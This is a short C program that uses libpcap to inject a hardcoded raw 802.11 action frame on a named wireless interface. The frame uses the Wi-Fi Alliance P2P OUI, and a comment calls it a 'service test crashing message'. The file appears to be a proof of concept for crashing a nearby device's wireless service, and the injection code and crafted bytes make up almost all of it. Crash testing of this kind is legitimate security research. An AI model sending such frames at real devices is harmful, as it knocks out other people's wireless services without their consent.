#include <stdio.h>
#include <stdlib.h>

#include <pcap/pcap.h>

int main() {
    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    pcap_errbuf[0]='\0';
    char* if_name = "wlx00c0caae6579";

    pcap_t* pcap=pcap_open_live(if_name,96,0,0,pcap_errbuf);
    printf("here1\n");
    if (pcap_errbuf[0]!='\0') {
        fprintf(stderr,"%s",pcap_errbuf);
    }
    printf("here2\n");
    if (!pcap) {
        exit(1);
    }

    // service test crashing message
    uint8_t own_buffer[] = {
        0x00,
        0x03,
        0x03,
        0x23,
        0x00,
        0x06,
        0x02,
        0x00,
        0x00,
        0x00,
        0x00,
        0xd0,
        0x18,
        0x00,
        0x00,
        0x04,
        0x00,
        0x00,
        0x0b,
        0x00,
        0x00,
        0x80,
        0x02,
        0x00,
        0x00,
        0x00,
        0x00,
        0xd0,
        0x00,
        0x3a,
        0x01,
        0x02,
        0x1f,
        0x7a,
        0xa6,
        0xa8,
        0xd3,
        0x00,
        0xc0,
        0xca,
        0xae,
        0x65,
        0x79,
        0x50,
        0x6f,
        0x9a,
        0x01,
        0x1b,
        0xa0,
        0x70,
        0x03,
        0x04,
        0x09,
        0x50,
        0x6f,
        0x9a,
        0x13,
        0x03,
        0x16,
        0x00,
        0x9f,
        0x20,
        0x77,
        0x6f,
        0x72,
        0x6c,
        0x64,
        0x21,
        0x00,
        0x00,
        0x00,
        0x00,
        0x00
    };

    if (pcap_inject(pcap,&own_buffer,sizeof(own_buffer))==-1) {
        pcap_perror(pcap,0);
        pcap_close(pcap);
        exit(1);

        pcap_close(pcap);
    }

    // uint8_t* req[] = {0x12, 0x12, 0x12};

    // if (pcap_inject(pcap,&req,sizeof(req))==-1) {
    //     pcap_perror(pcap,0);
    //     pcap_close(pcap);
    //     exit(1);

    //     pcap_close(pcap);
    // }
}